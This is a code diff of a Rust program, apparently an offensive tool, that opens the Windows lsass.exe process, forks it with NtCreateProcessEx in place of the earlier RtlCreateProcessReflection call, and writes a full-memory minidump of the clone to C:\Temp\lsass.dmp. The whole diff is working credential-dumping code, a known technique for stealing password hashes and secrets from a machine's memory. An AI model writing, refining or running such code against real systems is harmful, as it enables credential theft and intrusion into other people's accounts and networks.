@@ -4,10 +4,13 @@ use std::{
     ptr::{null, null_mut},
 };
 
-use ntapi::ntrtl::{
-    RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES,
-    RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION,
-    RtlCreateProcessReflection,
+use ntapi::{
+    ntpsapi::NtCreateProcessEx,
+    ntrtl::{
+        RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES,
+        RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION,
+        RtlCreateProcessReflection,
+    },
 };
 use windows_sys::{
     Wdk::System::SystemInformation::NtQuerySystemInformation,
@@ -35,7 +38,7 @@ use windows_sys::{
                 },
             },
             Threading::{
-                GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
+                GetCurrentProcess, GetProcessId, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
                 PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
             },
             WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
@@ -177,18 +180,23 @@ fn main() {
 
         println!("[+] Opened handle to lsass.exe process: {:?}", lsass_handle);
 
-        let mut reflection_information = zeroed::<RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION>();
-        let flags = RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
-            | RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
-            | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE;
-        let status = RtlCreateProcessReflection(
+        let mut fork_handle: *mut c_void = null_mut();
+        let status = NtCreateProcessEx(
+            &mut fork_handle as *mut *mut c_void as _,
+            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+            null_mut(),
             lsass_handle as _,
-            flags,
+            0,
             null_mut(),
             null_mut(),
             null_mut(),
-            &mut reflection_information,
+            0,
         );
+
+        if !NT_SUCCESS(status) {
+            println!("[-] Failed to create process reflection of lsass.exe process");
+            return;
+        }
 
         CloseHandle(lsass_handle);
 
@@ -197,12 +205,9 @@ fn main() {
             return;
         }
 
-        let pid = reflection_information.ReflectionClientId.UniqueProcess as u32;
-        let clone_handle = reflection_information.ReflectionProcessHandle;
+        let pid = GetProcessId(fork_handle);
 
         println!("[+] Successfully cloned lsass.exe with PID: {}", pid);
-
-        WaitForSingleObject(clone_handle as _, 500);
 
         let file_handle = CreateFileA(
             "C:\\Temp\\lsass.dmp\0".as_ptr() as *const u8,
@@ -220,7 +225,7 @@ fn main() {
         }
 
         if MiniDumpWriteDump(
-            clone_handle as _,
+            fork_handle as _,
             pid,
             file_handle,
             MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo,
